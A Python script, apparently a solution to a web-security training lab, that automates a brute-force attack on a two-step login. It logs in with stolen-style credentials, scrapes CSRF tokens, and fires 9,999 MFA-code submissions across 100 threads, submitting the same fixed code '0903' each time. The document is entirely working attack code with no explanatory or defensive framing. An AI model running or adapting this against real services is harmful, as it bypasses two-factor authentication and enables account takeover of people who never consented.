import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

def check_otp(mfa_code):
    url = 'https://0ac7008a03ff062c8044eea600a700da.web-security-academy.net'

    data = {
        'csrf': '',
        'username': 'carlos',
        'password': 'montoya'
    }

    with requests.session() as s:
        r = s.get(url=url+'/login')
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find('input', attrs={'name': 'csrf'})['value']
        data['csrf'] = csrf
        r = s.post(url=url+'/login', data=data)
        data2 = {
            'csrf': '',
            'mfa-code': mfa_code
        }
        r = s.get(url=url+'/login2')
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find('input', attrs={'name': 'csrf'})['value']
        data2['csrf'] = csrf
        r = s.post(url=url+'/login2', data=data2)
        if 'Incorrect security code' not in r.text:
            print(r.text)

if __name__ == '__main__':
    # List of MFA codes to check
    mfa_codes = ['0903'] * 9999

    # Create a progress bar
    with tqdm(total=len(mfa_codes)) as pbar:
        # Function to update the progress bar
        def update(*args):
            pbar.update()

        # Run tasks with ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=100) as executor:
            for mfa_code in mfa_codes:
                executor.submit(check_otp, mfa_code).add_done_callback(update)
